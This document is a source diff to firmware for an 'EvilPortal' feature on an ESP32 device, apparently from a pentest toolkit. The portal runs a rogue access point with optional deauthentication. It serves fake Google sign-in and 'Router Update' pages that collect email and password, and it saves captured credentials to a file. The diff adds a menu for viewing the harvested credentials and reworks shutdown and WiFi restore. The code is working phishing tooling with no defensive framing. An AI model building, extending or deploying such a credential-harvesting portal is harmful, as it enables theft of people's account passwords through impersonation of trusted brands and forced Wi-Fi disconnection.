@@ -15,6 +15,11 @@ EvilPortal::EvilPortal(
 )
     : apName(tssid), _channel(channel), _deauth(deauth), _verifyPwd(verifyPwd), _autoMode(autoMode),
       _backgroundMode(backgroundMode), webServer(80) {
+    
+    // Store original WiFi state before making any changes
+    _originalWifiMode = WiFi.getMode();
+    _wifiWasConnected = (WiFi.status() == WL_CONNECTED);
+    
     if (!setup()) return;
     // Now stop WebUI cleanly before starting WiFi mode
     cleanlyStopWebUiForWiFiFeature();
@@ -26,16 +31,7 @@ EvilPortal::EvilPortal(
 }
 
 EvilPortal::~EvilPortal() {
-    // Clean up handler to prevent memory leak
-    if (_captiveHandler) {
-        webServer.removeHandler(_captiveHandler);
-        delete _captiveHandler;
-        _captiveHandler = nullptr;
-    }
-    webServer.end();
-    dnsServer.stop();
-    vTaskDelay(100 / portTICK_PERIOD_MS);
-    wifiDisconnect();
+    // Empty - all cleanup done in loop()
 }
 
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
@@ -240,37 +236,40 @@ void EvilPortal::setupRoutes() {
     });
 
     // Store handler pointer for cleanup
+    // Do not remove it on exit else it will cause system to crash
+    // it will be automatically "burned" when server is stopped
     _captiveHandler = new CaptiveRequestHandler(this);
     webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
 }
 
 void EvilPortal::restartWiFi(bool reset) {
-    // Clean up old handler before restart
-    if (_captiveHandler) {
-        webServer.removeHandler(_captiveHandler);
-        delete _captiveHandler;
-        _captiveHandler = nullptr;
-    }
-
+    // Let server handle cleanup - just stop and restart
     webServer.end();
+    dnsServer.stop();
+    vTaskDelay(100 / portTICK_PERIOD_MS);
+    
+    // Don't touch _captiveHandler - server owns it
+    _captiveHandler = nullptr;
+    
     wifiDisconnect();
-    WiFi.softAP(apName);
+    WiFi.softAP(apName, emptyString, _channel);
+    vTaskDelay(100 / portTICK_PERIOD_MS);
+    
+    setupRoutes();  // This will create a new handler
+    dnsServer.start(53, "*", WiFi.softAPIP());
     webServer.begin();
-
-    // Re-add handler
-    _captiveHandler = new CaptiveRequestHandler(this);
-    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
-
+    
     if (reset) resetCapturedCredentials();
 }
 
 void EvilPortal::resetCapturedCredentials(void) { previousTotalCapturedCredentials = -1; }
 
 void EvilPortal::loop() {
-    if (_backgroundMode) return; // Background mode uses processRequests instead
+    if (_backgroundMode) return;
 
     int lastDeauthTime = millis();
     bool shouldRedraw = true;
+    bool exitPortal = false;
 
     while (true) {
         if (shouldRedraw) {
@@ -295,7 +294,51 @@ void EvilPortal::loop() {
             shouldRedraw = true;
         }
 
-        if (check(EscPress)) break;
+        if (check(EscPress)) {
+            options = {
+                {"Exit Portal", [&exitPortal]() { exitPortal = true; }},
+                {"View Creds", [this, &shouldRedraw]() {
+                    FS *fs;
+                    if (getFsStorage(fs)) {
+                        if (fs->exists("/BruceEvilCreds")) {
+                            loopSD(*fs, false, "CSV", "/BruceEvilCreds");
+                        } else {
+                            displayTextLine("No credentials yet");
+                            vTaskDelay(1000);
+                        }
+                    }
+                    shouldRedraw = true;
+                }},
+                {"Resume", [&shouldRedraw]() { shouldRedraw = true; }}
+            };
+            
+            loopOptions(options);
+            if (exitPortal) {
+                displayTextLine("Shutting down...");
+                vTaskDelay(100 / portTICK_PERIOD_MS);
+                
+                // Stop web server first
+                webServer.end();
+                vTaskDelay(200 / portTICK_PERIOD_MS);
+                
+                // Stop DNS
+                dnsServer.stop();
+                vTaskDelay(100 / portTICK_PERIOD_MS);
+                
+                // Restore original WiFi mode
+                WiFi.mode(_originalWifiMode);
+                vTaskDelay(100 / portTICK_PERIOD_MS);
+                
+                // Stop wifi else it will stay on but not connected to any AP
+                // and the stack will get confused so no connect/disconnect option
+                // will be shown on wifi menu after and it will just waste battery
+                wifiDisconnect();
+                vTaskDelay(100 / portTICK_PERIOD_MS);
+                
+                return;
+            }
+            shouldRedraw = true;
+        }
 
         if (verifyPass) {
             wifiDisconnect();
@@ -308,14 +351,11 @@ void EvilPortal::loop() {
 void EvilPortal::processRequests() {
     if (!_backgroundMode) return;
     dnsServer.processNextRequest();
-    // Check for credentials without UI updates
     if (totalCapturedCredentials != (previousTotalCapturedCredentials + 1)) {
         previousTotalCapturedCredentials = totalCapturedCredentials - 1;
-        // In background mode, we don't redraw, just let the tracker know
     }
 }
 
-// Karma Integration Methods
 bool EvilPortal::hasCredentials() { return totalCapturedCredentials > 0; }
 
 String EvilPortal::getCapturedPassword() { return lastCred; }
@@ -404,7 +444,9 @@ void EvilPortal::loadCustomHtml() {
         int apStart = firstLine.indexOf("<!-- AP=\"");
         if (apStart != -1) {
             int apEnd = firstLine.indexOf("\" -->", apStart);
-            if (apEnd != -1) { apName = firstLine.substring(apStart + 9, apEnd); }
+            if (apEnd != -1) {
+                apName = firstLine.substring(apStart + 9, apEnd);
+            }
         }
     }
 }
@@ -459,7 +501,7 @@ void EvilPortal::loadDefaultHtml_one() {
         "5px;cursor: pointer;font-size: 16px;transition: background-color 0.3s;}button:hover "
         "{background-color: #0056b3;}div#success-block{display: none;text-align: center;min-height: "
         "60px;margin-bottom: 30px;justify-content: center;align-items: center;}</style></head><body><div "
-        "class='container'><!-- Ícone No Signal em SVG --><svg xmlns='http://www.w3.org/2000/svg' "
+        "class='container'><svg xmlns='http://www.w3.org/2000/svg' "
         "fill='#000000' width='800px' height='800px' viewBox='0 -1 26 26'><path fill-opacity='.3' d='M24.24 "
         "8l1.35-1.68C25.1 5.96 20.26 2 13 2S.9 5.96.42 6.32l12.57 15.66.01.02.01-.01L20 "
         "13.28V8h4.24z'/><path d='M22 22h2v-2h-2v2zm0-12v8h2v-8h-2z'/></svg><h1>Router Update</h1><div "
@@ -503,7 +545,7 @@ void EvilPortal::loadDefaultHtml() {
         "class='container'><div class='logo-container'><?xml version='1.0' standalone='no'?><!DOCTYPE svg "
         "PUBLIC '-//W3C//DTD SVG 20010904//EN' "
         "'http://www.w3.org/TR/2001/REC-SVG-20010904/DTD/svg10.dtd'></div><div "
-        "class=form-container><center><div class='containerlogo'><!-- Google Logo --><div id='logo' "
+        "class=form-container><center><div class='containerlogo'><div id='logo' "
         "title='Google'><svg viewBox='0 0 75 24' width='75' height='24' xmlns='http://www.w3.org/2000/svg' "
         "aria-hidden='true'><g id='qaEJec'><path fill='#ea4335' d='M67.954 16.303c-1.33 "
         "0-2.278-.608-2.886-1.804l7.967-3.3-.27-.68c-.495-1.33-2.008-3.79-5.102-3.79-3.068 0-5.622 "
@@ -527,7 +569,7 @@ void EvilPortal::loadDefaultHtml() {
         "1.07.16 1.664 0 1.903-.52 4.26-2.19 5.934-1.63 1.7-3.71 2.61-6.48 2.61-5.12 0-9.42-4.17-9.42-9.29C0 "
         "4.17 4.31 0 9.43 0c2.83 0 4.843 1.108 6.362 2.56L14 4.347c-1.087-1.02-2.56-1.81-4.577-1.81-3.74 "
         "0-6.662 3.01-6.662 6.75s2.93 6.75 6.67 6.75c2.43 0 3.81-.972 "
-        "4.69-1.856z'></path></g></svg></div><!-- /Google Logo --></div></center><div style='min-height: "
+        "4.69-1.856z'></path></g></svg></div></div></center><div style='min-height: "
         "150px'><center><div class='containertitle'>Sign in</div><div class='containersubtitle'>Use your "
         "Google Account</div></center><form action='/post' id='login-form'><input name='email' "
         "class='input-field' type='text' placeholder='Email or phone' required><input name='password' "
